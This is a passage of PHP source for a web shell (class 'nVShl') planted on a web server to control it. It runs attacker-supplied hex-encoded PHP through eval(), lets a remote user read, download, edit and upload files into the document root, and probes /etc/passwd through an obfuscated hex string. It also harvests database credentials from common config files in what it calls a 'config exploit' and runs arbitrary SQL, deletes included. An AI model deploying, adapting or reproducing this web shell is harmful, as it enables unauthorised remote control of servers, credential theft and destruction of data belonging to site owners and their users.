					$access .= (($perms & 0x0001) ? (($perms & 0x0200)?'t':'x') : (($perms & 0x0200)?'T':'-'));
					break;	
				case 'n':
					$access .= substr(sprintf('%o', $perms), -4);
					break;
				case 's':
					$access .= $this->format_fperms($path, 'r');
					$access .= $this->format_fperms($path, 'w');
					$access .= $this->format_fperms($path, 'x');
					break;
				case 't':
					$tmp_chkA = $this->str_fromArray($this->path_strip($path), "/", "path");
					$tmp_chkB = $this->str_fromArray($this->path_strip(readlink($path)), "/", "path");
					
					if(strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
						$ext = pathinfo($tmp_chkA, PATHINFO_EXTENSION);
						if($ext == "lnk") {
							$access = 'l';
						}else if(($perms & 0x4000) == 0x4000) {
							$access = 'd';
						}else if(($perms & 0x8000) == 0x8000) {
							$access = 'f';
						}else {
							$access = 'u';
						}
					}else {
						if(strlen($tmp_chkB) > 0) {
							$access = 'l';
						}else if(($perms & 0x4000) == 0x4000) {
							$access = 'd';
						}else if(($perms & 0x8000) == 0x8000) {
							$access = 'f';
						}else{
							$access = 'u';
						}
					}
					break;
				case 'tl':
					if(($perms & 0x4000) == 0x4000) {
						$access = 'd';
					}else if(($perms & 0x8000) == 0x8000) {
						$access = 'f';
					}else {
						$access = 'l';
					}
					break;
				case 'r':
					if(fileowner($path) == fileowner(dirname(__FILE__))) $access .= (($perms & 0x0100) ? 'r' : '-');
					else $access .= (($perms & 0x0004) ? 'r' : '-');
					break;
				case 'w':
					if(fileowner($path) == fileowner(dirname(__FILE__))) $access .= (($perms & 0x0080) ? 'w' : '-');
					else $access .= (($perms & 0x0002) ? 'w' : '-');
					break;
				case 'x':
					if(fileowner($path) == fileowner(dirname(__FILE__))) $access .= (($perms & 0x0040) ? (($perms & 0x0800)?'s':'x') : (($perms & 0x0800)?'S':'-'));
					else $access .= (($perms & 0x0001) ? (($perms & 0x0200)?'t':'x') : (($perms & 0x0200) ?'T':'-'));
					break;
				default: $access .= 'E';
			}
			return $access;	
		}
		
		function path_strip($path) {
			$raw = array();
			
			$path = str_replace("\\", "/", $path);
			if($this->str_startsWith("./", $path)) {
				$entire = str_replace("\\", "/", dirname(__FILE__));
				$ppath = explode("/", $entire);
				$raw = $this->path_strip_pdp($ppath, $raw);
			}

			$tpath = explode("/", $path);
			$raw = $this->path_strip_pdp($tpath, $raw);

			return $raw;
		}
		
		function path_strip_pdp($path, $stack) {
			if(sizeof($path) > 1) {
				if(sizeof($path) == 2) {
					if($path[1] != ".") {
						if($path[1] == "..") 
							array_pop($stack);
						else
							$stack[] = $path[1];
					}
				}else {
					for($i=1; $i<sizeof($path); $i++) {
						if($path[$i] != "" && $path[$i] != ".") {
							if($path[$i] == "..") 
								array_pop($stack);
							else
								$stack[] = $path[$i];
						}
					}
				}
			}

			return $stack;
		}
		
		function str_startsWith($needle, $string) {
			$length = strlen($needle);
			return (substr($string, 0, $length) === $needle);
		}

		function str_endsWith($needle, $string) {
			$start  = strlen($string) - strlen($needle);
			return (substr($string, $start) === $needle);
		}

		function str_fromArray($stack, $delimiter=" ", $type="") {
			$string = "";
			for($i=0; $i<sizeof($stack); $i++) {
				switch($type) {
					case "path":
						$string .= $delimiter.$stack[$i];
						break;
					default:
						if(strlen($string) == 0)
							$string .= $stack[$i];
						else
							$string .= $delimiter.$stack[$i];
				}
			}
			return $string;
		}
	}
			
	$NVShl = new nVShl();

	if(!isset($_SESSION['explore'])) {
		$_SESSION['chdir'] = dirname(__FILE__);
		$_SESSION['file'] = "";
		$_SESSION['ftp_file_upload_type'] = "uF1";
		
		$_SESSION['users_passwd'] = ($NVShl->is_this_file($NVShl->hexToStr('2f6574632f706173737764'))? "true":"false");
		if($_SESSION['users_passwd'] == "true")
			$_SESSION['users_mode'] = "uPasswd";
		else
			$_SESSION['users_mode'] = "uScan";
		$_SESSION['users_dir'] = "/home";
		
		$_SESSION['connect'] = '';
		$_SESSION['dbhost'] = '';
		$_SESSION['dbuser'] = '';
		$_SESSION['dbpass'] = '';
		$_SESSION['dbselect'] = '';
		$_SESSION['dbqt'] = '';
		$_SESSION['dbquery'] = '';
		
		$_SESSION['system_code'] = '';
	}
	
	if(!isset($_SESSION['explore']) || isset($_GET['main'])){
		$_SESSION['explore'] = "main";
	}
			
	if(isset($_GET['ftp'])) {
		$_SESSION['explore'] = "ftp";
	} 
	if(isset($_GET['ftp_file_upload_type'])) {
		$_SESSION['ftp_file_upload_type'] = $_GET['ftp_file_upload_type'];
	} 
	if(isset($_GET['ftp_file_download'])) {
		if(is_file($_GET['ftp_file_download'])) {
			$vec = explode("/", $_GET['ftp_file_download']);
				
			header('Content-disposition: attachment; filename="'. $vec[sizeof($vec)-1] .'"');
			header('Content-type: application/octet-stream');
			readfile($_GET['ftp_file_download']);
			exit;
		}
	} 
		
	if(isset($_GET['mysql'])){
		$_SESSION['explore'] = "mysql";
	}
	
	if(isset($_GET['users'])){
		$_SESSION['explore'] = "users";
	}
	if(isset($_GET['users_mode'])) {
		$_SESSION['users_mode'] = $_GET['users_mode'];
		if(isset($_GET['users_dir']))
			$_SESSION['users_dir'] = $_GET['users_dir'];
	} 
	
	if(isset($_GET['system'])){
		$_SESSION['explore'] = "system";
	}
	
	if(isset($_GET['sym']) && strlen($_GET['sym']) > 0) {
		$NVShl->gen_sym($_GET['sym'], $_GET['sts'], $_GET['eds']);
	}
	
	if(isset($_GET['t-t'])) {
		if($_SESSION['explore'] == "main") {
			$NVShl->top("Main -> From " . $_SERVER['REMOTE_ADDR']);
			$NVShl->logo();
			$NVShl->buttom();
		}
	
		if($_SESSION['explore'] == "users") {
			$_SESSION['explore'] = "ftp";
			$NVShl->top("Main -> From " . $_SERVER['REMOTE_ADDR']);
			$NVShl->get_users();
			$NVShl->buttom();
	
			die();
		}
		
		if($_SESSION['explore'] == "system") {
			$NVShl->top("Main -> From " . $_SERVER['REMOTE_ADDR']);
			$dplac = "";
			$content = '<table width=70% align="center" border="1">';
			
			if(isset($_POST['seteval'])) {
				$action = $NVShl->hexToStr($_POST['seteval']);
				eval($action);
				
				$dplac = str_replace("<", "&lt;", $action);
				$dplac = str_replace(">", "&gt;", $dplac);
			}else {
				$dplac = str_replace("<", "&lt;", $_SESSION['system_code']);
				$dplac = str_replace(">", "&gt;", $dplac);
			}
	
			$content .= '<tr><td align="center"><textarea id="doeval" cols=100 rows=25>'.$dplac.'</textarea><br><input type="submit" value="Eval" onclick="system_php_eval();"></td></tr></table>';
	
			$NVShl->dPlay($content);
			$NVShl->buttom();
		}
			// FTP - MOD
		if($_SESSION['explore'] == "ftp") {
			$NVShl->top("Ftp -> From " . $_SERVER['REMOTE_ADDR']);
			
			if(isset($_POST['delete']) && isset($_POST['type'])) {
				$NVShl->exp_actions($_POST['delete'], "", $_POST['type'], false);
			}
			
			if(isset($_POST['save'])) {
				if(is_file($_POST['save'])){
					if(isset($_POST['vedit'])) {
						$save = @fopen($_POST['save'], 'w') or die("<center>Can't open file !</center>");
						fwrite($save, $NVShl->hexToStr($_POST['vedit']));
						fclose($save);
					}
				}
			}
			
			if(isset($_GET['copyfile'])) {
				echo "Trying to copy file<br>";
				if (copy($_SESSION['file'], $_GET['tofile'])) {
					echo "Copied !";
				}else if(rename($_SESSION['file'], $_GET['tofile'])) {
					echo "Renamed";
				}else {
					echo "Impossible";
				}
			}
		
			if($_SESSION['ftp_file_upload_type'] == "uF1") {
				echo "<table align='center' bgcolor='#FFFFFF' width=100%>
					<tr align='center'><td bgcolor='#122112' colspan=1000><b> Uploading by ftp session ...</b></td></tr>
					<tr align='center'><td><form action='{$_SERVER['PHP_SELF']}?{$_SERVER['QUERY_STRING']}' method='post' enctype='multipart/form-data'>
					 Upload File:<input type='file' name='upfile' id='upfile'>  With Name:<input type='text' name='myfile_session'><input type='submit' value='Submit'></form></td></tr>";
				
				if(isset($_POST['myfile_session'])) {
					if ($_FILES['upfile']['error'] > 0){
						echo "<tr align='center'><td><font color=red>Error: Impossible to upload file.</font></td></tr>";
					}else {
						echo "<tr align='center'><td>Uploaded <b>" . $_FILES['upfile']['name'] . "</b> and stored into: <b>" . $_FILES['upfile']['tmp_name']. "</b></td></tr>";
						if(move_uploaded_file($_FILES['upfile']['tmp_name'], $_SESSION['chdir']."/" . $_POST['myfile_session'])) {
							chmod($_SESSION['chdir']."/" . $_POST['myfile_session'], 0755);
							echo "<tr align='center'><td>Moved from ". $_FILES['upfile']['tmp_name'] ." into <b>". $_SESSION['chdir']. "/" . $_POST['myfile_session']. "</b></td></tr>";
						}else if(rename($_FILES['upfile']['tmp_name'], $_SESSION['chdir']. "/" . $_POST['myfile_session'])){
							chmod($_SESSION['chdir']."/" . $_POST['myfile_session'], 0755);
							echo "<tr align='center'><td>Renamed from ".$_FILES['upfile']['tmp_name']." to <b>". $_SESSION['chdir']. "/" . $_POST['myfile_session']. "</b></td></tr>";
						}else
							echo "<tr align='center'><td><font color=red>Error: It`s impossible to move/rename the file from the temp.</font></td></tr>";
					}
				}
				
				echo "</table>";
			}
			
			if($_SESSION['ftp_file_upload_type'] == "uF2") {
				echo "<table align='center' bgcolor='#FFFFFF' width=100%>
					<tr align='center'><td bgcolor='#122112' colspan=1000><b> Uploading by server root...</b></td></tr>
					<tr align='center'><td><form action='{$_SERVER['PHP_SELF']}?{$_SERVER['QUERY_STRING']}' method='post' enctype='multipart/form-data'>
					 Upload File:<input type='file' name='upfile' id='upfile'>  With Name:<input type='text' name='myfile_root'><input type='submit' value='Submit'></form></td></tr>";
				
				if(isset($_POST['myfile_root'])) {
					if ($_FILES['upfile']['error'] > 0){
						echo "<tr align='center'><td><font color=red>Error: Impossible to upload file.</font></td></tr>";
					}else {
						echo "<tr align='center'><td>Uploaded <b>" . $_FILES['upfile']['name'] . "</b> and stored into: <b>" . $_FILES['upfile']['tmp_name']. "</b></td></tr>";
						if(move_uploaded_file($_FILES['upfile']['tmp_name'], $_SERVER["DOCUMENT_ROOT"] ."/" . $_POST['myfile_root'])) {
							chmod($_SERVER["DOCUMENT_ROOT"] ."/" . $_POST['myfile_root'], 0755);
							echo "<tr align='center'><td>Moved from ". $_FILES['upfile']['tmp_name'] ." into <b>". $_SERVER["DOCUMENT_ROOT"]. "/" . $_POST['myfile_root']. "</b></td></tr>";
						}else if(rename($_FILES['upfile']['tmp_name'], $_SERVER["DOCUMENT_ROOT"] . "/" . $_POST['myfile_root'])){
							chmod($_SERVER["DOCUMENT_ROOT"] ."/" . $_POST['myfile_root'], 0755);
							echo "<tr align='center'><td>Renamed from ".$_FILES['upfile']['tmp_name']." to <b>". $_SERVER["DOCUMENT_ROOT"]. "/" . $_POST['myfile_root']. "</b></td></tr>";
						}else
							echo "<tr align='center'><td><font color=red>Error: It`s impossible to move/rename the file from the temp.</font></td></tr>";
					}
				}
				
				echo "</table>";
			}
			
			$NVShl->get_chdir();
			$NVShl->get_file();
			
			$NVShl->buttom();
		}
			// MYSQL - MOD
		if($_SESSION['explore'] == "mysql") {
			if(isset($_GET['connect'])) {
				$coninfo = explode(":", $_GET['connect']);
				if(sizeof($coninfo) == 3) {
					$dbhost = strlen($coninfo[0]) == 0 ? "localhost":$coninfo[0];
					$dbuser = $coninfo[1];
					$dbpass = $coninfo[2];
				}else if(sizeof($coninfo) == 4) {
					if($coninfo[3] == "hx") {
						$dbhost = strlen($coninfo[0]) == 0 ? "localhost":$coninfo[0];
						$dbuser = $NVShl->hexToStr($coninfo[1]);
						$dbpass = $NVShl->hexToStr($coninfo[2]);
					}
				}
				
				mysql_connect($dbhost, $dbuser, $dbpass) or die("<center><font color='#FFFFFF'>[MySQL] Invalid connection settings !</font></center>");
				
				$_SESSION['connect'] = 'true';
				$_SESSION['dbhost'] = $dbhost;
				$_SESSION['dbuser'] = $dbuser;
				$_SESSION['dbpass'] = $dbpass;
				
				header("Location: ?t-t");
			}else if(isset($_POST['conxmysql'])) {
				
				$dbhost = $_POST['hostname'];
				$dbuser = $_POST['hostuser'];
				$dbpass = $_POST['hostpass'];
					
				mysql_connect($dbhost, $dbuser, $dbpass) or die("<center><font color='#FFFFFF'>[MySQL] Invalid connection settings !</font></center>");

				$_SESSION['connect'] = 'true';
				$_SESSION['dbhost'] = $dbhost;
				$_SESSION['dbuser'] = $dbuser;
				$_SESSION['dbpass'] = $dbpass;
				header('Location: ?t-t');
			}else if(isset($_GET['disconnect'])) {
				$_SESSION['connect'] = '';
				header('Location: ?t-t');
			}else {
				$NVShl->top("MySQL -> From " . $_SERVER['REMOTE_ADDR']);
				$link = "";

				if($_SESSION['connect'] == 'true') {
					$link = mysql_connect($_SESSION['dbhost'], $_SESSION['dbuser'], $_SESSION['dbpass']) or die("<center><font color='#FFFFFF'>[MySQL] Invalid connection settings !</font></center>");
					echo "<center><font color='#FFFFFF'>[MySQL] Connection by session! Click <a href='?t-t&disconnect'>here</a> to disconnect !</font></center>";
				}else {
					
					echo "<center><font color='#FFFFFF'>[MySQL] Login form</font></center><br>";
					echo "<form action='?t-t' method='post'><table align='center'><tr><td>Hostname:</td>
										<td><input type='text' name='hostname' value='".(isset($_SESSION['dbhost'])?$_SESSION['dbhost']:"localhost")."'></td>
										<td>Username: </td>
										<td><input type='text' name='hostuser' value='".(isset($_SESSION['dbuser'])?$_SESSION['dbuser']:"")."'></td></tr>
									<tr><td align='center' colspan='2'><input type='submit' name='conxmysql' value='Connect'></td>
										<td>Password:</td>
										<td><input type='text' name='hostpass' value='".(isset($_SESSION['dbpass'])?$_SESSION['dbpass']:"")."'></td></tr></table></form>";
					
					$tfile = "";
					$stock = "";
					$arrInfo = array();
					
					if(is_file('config.php')) {
						$tfile = fopen('config.php', "r"); 
					}else if(is_file('config.inc.php'))
						$tfile = fopen('config.inc.php', "r");
					else if(is_file('config_all.php')) 
						$tfile = fopen('config_all.php', "r");
					else if(is_file('include/config.php')) 
						$tfile = fopen('include/config.php', "r");
					else if(is_file('inc/config.php')) 
						$tfile = fopen('inc/config.php', "r");
					else if(is_file('settings.php')) 
						$tfile = fopen('settings.php', "r");
					else if(is_file('connect.php'))
						$tfile = fopen('connect.php', "r"); 
					else
						return;
				
					$stock = $NVShl->parse_file_contents($tfile);
					
					echo "<center><font color='#FFFFFF'>[MySQL] Connection by config exploit!</font></center>";
					return;
				}
				$db_list = mysql_list_dbs($link);

				if(isset($_POST['reqsend'])) {
					if(isset($_POST['selectdb']) && $_POST['selectdb'] != "") {
						$_SESSION['dbselect'] = $_POST['selectdb'];
						if(!mysql_select_db($_SESSION['dbselect']))
							echo "Error: Database not found !";
					}
					
					if(isset($_POST['qt']) && $_POST['qt'] != "")
						$_SESSION['dbqt'] = $_POST['qt'];
					
					if(isset($_POST['sqlquery']) && $_POST['sqlquery'] != "") {
						$_SESSION['dbquery'] = $_POST['sqlquery'];
						$sqc = $_SESSION['dbquery'];
						$sqc = str_replace("<", "&lt;", $sqc);
						$sqc = str_replace(">", "&gt;", $sqc);
						
						echo "<table align='center' bgcolor='#FFFFFF' width=100%><tr align='center'><td bgcolor='#99CC00' colspan=1000><b>{$sqc}</b></td></tr>";
						$myresult = mysql_query($_SESSION['dbquery']);
			
						if($_SESSION['dbqt'] == 'none') {
							echo "<tr align='center'><td bgcolor='#99CC00' colspan=1000><b>Took effect ". mysql_affected_rows($myresult)." entries ...</b></td></tr>";
						}else {
							$ctres = 0;
							if($_SESSION['dbqt'] == 'array')
								while ($queryrow = mysql_fetch_array($myresult)) {
									echo "<tr>";
									for($i=0; $i<sizeof($queryrow); $i++)
										echo "<td>".$queryrow[$i]."</td>";
									echo "</tr>";
									$ctres++;
								}
							else if($_SESSION['dbqt'] == 'row')
								while ($queryrow = mysql_fetch_row($myresult)) {
									echo "<tr>";
									for($i=0; $i<sizeof($queryrow); $i++)
										echo "<td>".$queryrow[$i]."</td>";
									echo "</tr>";
									$ctres++;
								}
							else if($_SESSION['dbqt'] == 'assoc')
								while ($queryrow = mysql_fetch_assoc($myresult)) {
									echo "<tr>";
									for($i=0; $i<sizeof($queryrow); $i++)
										echo "<td>".$queryrow[$i]."</td>";
									echo "</tr>";
									$ctres++;
								}
							echo "<tr align='center'><td bgcolor='#99CC00' colspan=1000><b>Found {$ctres} results ...</b></td></tr>";
						}
						
						echo "</table>";
					}
				}else {
					echo "<form action='?{$_SERVER['QUERY_STRING']}' method='post' target='MyQuery'><table align=center bgcolor='#99CC00' width=100%>
					<tr align='center'><td colspan=2><font style='font-weight:bold;'>". $_SERVER['SERVER_SIGNATURE']."</font></td></tr>
					<tr><td>Select Database: <input type='text' name='selectdb' size='50' value='{$_SESSION['dbselect']}'></td>
						<td>Query type: <select name='qt'>";
					if($_SESSION['dbqt'] == "none")
						echo "<option value='none' selected='selected'>None</option>";
					else
						echo "<option value='none'>None</option>";
					
					if($_SESSION['dbqt'] == "query")
							echo "<option value='array' selected='selected'>Array</option>";
						else
							echo "<option value='array'>Array</option>";
					
					if($_SESSION['dbqt'] == "row")
						echo "<option value='row' selected='selected'>Row</option>";
					else
						echo "<option value='row'>Row</option>";
						
					if($_SESSION['dbqt'] == "assoc")
						echo "<option value='assoc' selected='selected'>Assoc</option>";
					else
						echo "<option value='assoc'>Assoc</option>";	
						
					echo "</select></td></tr><tr align='center'><td colspan=2><textarea name='sqlquery' style='width:100%; height:100;'>{$_SESSION['dbquery']}</textarea></td></tr>
							<tr align='center'><td colspan=2><input type='submit' name='reqsend' value='Exec SQL'></td></tr></table></form>";
				
					if(isset($_GET['db']) && isset($_GET['tb'])) {
						echo "<form action='?t-t&db={$_GET['db']}&tb={$_GET['tb']}' method='post'>
						<table align=center bgcolor='#99CC00'><tr><td></td><td>Column</td><td>Value</td><td></td></tr>
						<tr align='center'><td>Delete Entry:</td><td><input type='text' name='column'></td><td><input type='text' name='value'></td><td><input type='submit' value='Exec'></td></tr></table></form>";
						
						if(isset($_POST['column']) && isset($_POST['value'])) {
							$sql = "DELETE FROM {$_GET['db']}.{$_GET['tb']} WHERE {$_POST['column']}='{$_POST['value']}'";
							echo $sql;
							mysql_query($sql);
						}
					}
					
					echo "<table width=100 align='left' bgcolor='#CC6600'>";
					$sql = "SHOW DATABASES";
					$result = mysql_query($sql);
			
					if(mysql_num_rows($result) > 0) {
						while ($row = mysql_fetch_row($db_list)) {
							echo "<tr bgcolor='#000000'><td align=center><a href=?t-t&db={$row[0]}><font color='#FFFF00'style='font-size:12px; font-family:arial;font-weight:bold'>{$row[0]}</font></a></td></tr>";
							if(isset($_GET['db']) && $_GET['db'] == $row[0]) {
								$sql = "SHOW TABLES FROM {$_GET['db']}";
								$result = mysql_query($sql);
								$alter = 0;
									
								while ($row = mysql_fetch_row($result)) {
									if($alter == 0) {
										echo "<tr bgcolor='#333333'><td>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href=?t-t&db={$_GET['db']}&tb=$row[0]><font color='#66CCFF' style='font-size:9px; font-family:arial'>{$row[0]}</font></a></td></tr>";
										$alter = 1;
									}else {
										echo "<tr bgcolor='#666666'><td>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href=?t-t&db={$_GET['db']}&tb=$row[0]><font color='66CCFF' style='font-size:9px; font-family:arial'>{$row[0]}</font></a></td></tr>";
										$alter = 0;
									}
								}
							}
						}				
					}else {
						$sql = "SELECT schema_name FROM information_schema.schemata";
						$result = mysql_query($sql);
								
						while ($row = mysql_fetch_row($result)) {
							echo "<tr bgcolor='#000000'><td align=center><a href=?t-t&db={$row[0]}><font color='#FFFF00'style='font-size:12px; font-family:arial;font-weight:bold'>{$row[0]}</font></a></td></tr>";
									
							if(isset($_GET['db']) && $_GET['db'] == $row[0]) {
								$sqlGETDB = "SHOW TABLES FROM {$_GET['db']}";
								$resultGETDB = mysql_query($sqlGETDB);
								$alter = 0;
										
								while ($rowGETDB = mysql_fetch_row($resultGETDB)) {
									$content = "";
									if($alter == 0) { $content .= "<tr bgcolor='#333333'>"; $alter = 1; }
									else { $content .= "<tr bgcolor='#666666'>"; $alter = 0; }
									$content .= "<td>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href=?t-t&db={$_GET['db']}&tb=$rowGETDB[0]><font color='#66CCFF' style='font-size:9px; font-family:arial'>{$rowGETDB[0]}</font></a></td></tr>";				
									echo $content ;
								}
							}
						}
								
						if(isset($_GET['dbcross']) && $_GET['dbcross'] != "") {
							echo "<tr bgcolor='#000000'><td align=center><a href=?t-t&db={$_GET['dbcross']}><font color='#FFFF00'style='font-size:12px; font-family:arial;font-weight:bold'>{$_GET['dbcross']}</font></a></td></tr>";
							$sqlGETDB = "SHOW TABLES FROM {$_GET['dbcross']}";
							$resultGETDB = mysql_query($sqlGETDB);
							$alter = 0;
												
							while ($rowGETDB = mysql_fetch_row($resultGETDB)) {
								$content = "";
								if($alter == 0) { $content .= "<tr bgcolor='#333333'>"; $alter = 1; }
								else { $content .= "<tr bgcolor='#666666'>"; $alter = 0; }
								$content .= "<td>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href=?t-t&db={$_GET['dbcross']}&tb=$rowGETDB[0]><font color='#66CCFF' style='font-size:9px; font-family:arial'>{$rowGETDB[0]}</font></a></td></tr>";			
								echo $content ;
							}
						}
					}
					echo "</table>";
					
					if(isset($_GET['db']) && isset($_GET['tb'])) {
						$sql = 'SHOW COLUMNS FROM '.$_GET['db'].'.'.$_GET['tb'];
						$result = mysql_query($sql);
						
						echo "<table align='left' width=80%><tr  bgcolor='#999999'>";
						while ($row_col = mysql_fetch_row($result))
							echo '<td bgcolor="#425666" align="center"><font color="#FFFFFF" style="font-size:12px; font-family:arial; font-weight:bold">'.$row_col[0].'</font></td>';
						echo "</tr>"; 
						
						$qry2 = 'SELECT * FROM '.$_GET['db'].'.'.$_GET['tb'];
						$result2 = mysql_query($qry2);
						$num_rows = mysql_num_rows($result2);

						$page_no = 0;
						$page_rm = 0;
						$pp_page = 20;
						$ps_page = 5;
						
						if((float)($num_rows/$pp_page) > (int)($num_rows/$pp_page)) {
							$page_rm = (int)($num_rows/$pp_page+1);
						}else {
							$page_rm = (int)($num_rows/$pp_page);
						}
							
						if(isset($_GET['p']) && is_numeric($_GET['p'])) {
							if((int)($_GET['p']-1) > 0) {
								if((int)($_GET['p']) > $page_rm) {
									$page_no = (int)($page_rm-1);
								}else {
									$page_no = (int)($_GET['p']-1);
								}
							}else
								$page_no = 0;
						}

						$sql = 'SELECT * FROM '.$_GET['db'].'.'.$_GET['tb'].' LIMIT '.($page_no*$pp_page).','.$pp_page;
						$result = mysql_query($sql);
						
						while ($row_line = mysql_fetch_row($result)) {
							echo "<tr bgcolor='#999999'>";
							for($i=0; $i<sizeof($row_line); $i++) {
								$content = $row_line[$i];
								$content = str_replace("<", "&lt;", $content);
								$content = str_replace(">", "&gt;", $content);
								echo "<td bgcolor='#425666'>{$content}</td>";
							}
							echo "</tr>";
						}
						
						echo"</table>";
						echo "<table border='1' cellpadding='3' align='center' WIDTH='40%' class=hov>
								<tr align='center'><td>";
								for($i=0; $i<$page_rm; $i++) {
									if($i == 0 || ($page_no > $i - $ps_page && $page_no < $i + $ps_page) || $i == $page_rm-1) {
										if($page_no == $i) {
											echo '<a href="?t-t&db='.$_GET['db'].'&tb='.$_GET['tb'].'&p='.($i+1).'" style="text-decoration:none; color:orange"><b>'.($i+1).'</b></a>';
										}else {
											echo '&nbsp;<a href="?t-t&db='.$_GET['db'].'&tb='.$_GET['tb'].'&p='.($i+1).'" style="text-decoration:none; color:white">'.($i+1).'</a>&nbsp;';
										}
									} else {
										if(($i == $page_no - $ps_page || $i == $page_no + $ps_page) && $i != 0)
											echo '...';
									}
								}
						echo "</td></tr></table>";
					}
				}
				
				$NVShl->buttom();
			}
		}
	}else {
		header("Location: ?t-t");	
	}
?>